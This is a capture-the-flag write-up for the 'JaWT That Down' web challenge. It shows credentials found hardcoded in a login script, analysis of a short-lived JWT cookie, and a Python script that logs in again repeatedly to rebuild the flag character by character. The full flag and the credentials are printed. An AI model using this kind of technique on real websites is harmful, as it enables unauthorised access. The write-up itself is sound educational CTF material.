# JaWT That Down

## Challenge Description
> The new ultra maximum security plugin I installed on my website is so good that even I can’t log in. Hackers don’t stand a chance.

## Solution
I saw that there was a login dashboard and that it required a username and a password.
So I tried to insert a ```'``` and a couple others to see if it breaks something - it did not.

After realizing it wasn't a SQLi, I tried to look at the script that is being loaded on the login screen /js/login.js.
It was minified and most of it wasn't important, I searched for the keyword "username" to see where the credentials are being passed,
and I saw that the developer left the credentials in the script:

![image](https://user-images.githubusercontent.com/54234250/167389421-0869bd99-0435-499f-8f3d-7aab0d889eaf.png)

After I logged in, a new tab showed up called "Flag" which leads to ```https://jawt.sdc.tf/s```, I pressed it and got ```Invalid Token: Access Denied```,
my initial thought was to look at the cookie because it said ```Invalid Token``` which maybe referred to the token in the cookie:

![image](https://user-images.githubusercontent.com/54234250/167390289-2e296c73-1ce9-4bd1-b2f0-52fabd25f2f8.png)

It is base64 encoded, and I recognize that is it a ```JWT``` token - fits to the title of the challenge.

![image](https://user-images.githubusercontent.com/54234250/167390689-969da869-86d2-4e4e-b55a-36e603c5a58e.png)

We see that the token expires after 2 seconds because of the ```exp``` field.
So I figured that we need a script to access that directory in time, so I wrote this:

```python
import requests

sess = requests.Session()
url = "https://jawt.sdc.tf/"

# find username and password from /js/login.js
def login():
	sess.post(url + "login", data={"username":"AzureDiamond", "password":"hunter2"})
	
login()
resp = sess.get(url + "s")
print(resp.text)
```
The output was ```d```, and after a moment of thinking what could that mean, I came with an idea that maybe we need to iterate through the directories and assemble the flag that way.
I tried to access the next directory ```https://jawt.sdc.tf/d```, but that just gave ```Not Found```, so after another moment of thinking, I tried different cominations until I found something that worked - ```https://jawt.sdc.tf/s/d```, and because the token expired after two seconds, my script couldn't assemble the full flag in time, so I just logged in again when I got the ```Access Denied``` message.

here is the full script:
```python
import requests

sess = requests.Session()
url = "https://jawt.sdc.tf/"

# find username and password from /js/login.js
def login():
	sess.post(url + "login", data={"username":"AzureDiamond", "password":"hunter2"})

def get_next_dir():
	resp = sess.get(url + flag)
	return resp.text


next_dir = "s"
flag = next_dir
while next_dir != '}':
	next_dir = get_next_dir()
	if "Access" in next_dir:
		login()
		next_dir = get_next_dir()
		
	flag += "/" + next_dir
	print(flag.replace("/", ""))
```
Output:
```
sd
sdc
sdct
sdctf
sdctf{
sdctf{T
sdctf{Th
sdctf{Th3
sdctf{Th3_
sdctf{Th3_m
sdctf{Th3_m0
sdctf{Th3_m0r
sdctf{Th3_m0r3
sdctf{Th3_m0r3_
sdctf{Th3_m0r3_t
sdctf{Th3_m0r3_t0
sdctf{Th3_m0r3_t0k
sdctf{Th3_m0r3_t0k3
sdctf{Th3_m0r3_t0k3n
sdctf{Th3_m0r3_t0k3ns
sdctf{Th3_m0r3_t0k3ns_
sdctf{Th3_m0r3_t0k3ns_t
sdctf{Th3_m0r3_t0k3ns_th
sdctf{Th3_m0r3_t0k3ns_the
sdctf{Th3_m0r3_t0k3ns_the_
sdctf{Th3_m0r3_t0k3ns_the_l
sdctf{Th3_m0r3_t0k3ns_the_le
sdctf{Th3_m0r3_t0k3ns_the_le5
sdctf{Th3_m0r3_t0k3ns_the_le55
sdctf{Th3_m0r3_t0k3ns_the_le55_
sdctf{Th3_m0r3_t0k3ns_the_le55_p
sdctf{Th3_m0r3_t0k3ns_the_le55_pr
sdctf{Th3_m0r3_t0k3ns_the_le55_pr0
sdctf{Th3_m0r3_t0k3ns_the_le55_pr0b
sdctf{Th3_m0r3_t0k3ns_the_le55_pr0bl
sdctf{Th3_m0r3_t0k3ns_the_le55_pr0bl3
sdctf{Th3_m0r3_t0k3ns_the_le55_pr0bl3m
sdctf{Th3_m0r3_t0k3ns_the_le55_pr0bl3ms
sdctf{Th3_m0r3_t0k3ns_the_le55_pr0bl3ms_
sdctf{Th3_m0r3_t0k3ns_the_le55_pr0bl3ms_a
sdctf{Th3_m0r3_t0k3ns_the_le55_pr0bl3ms_ad
sdctf{Th3_m0r3_t0k3ns_the_le55_pr0bl3ms_adf
sdctf{Th3_m0r3_t0k3ns_the_le55_pr0bl3ms_adf3
sdctf{Th3_m0r3_t0k3ns_the_le55_pr0bl3ms_adf3d
sdctf{Th3_m0r3_t0k3ns_the_le55_pr0bl3ms_adf3d}
```
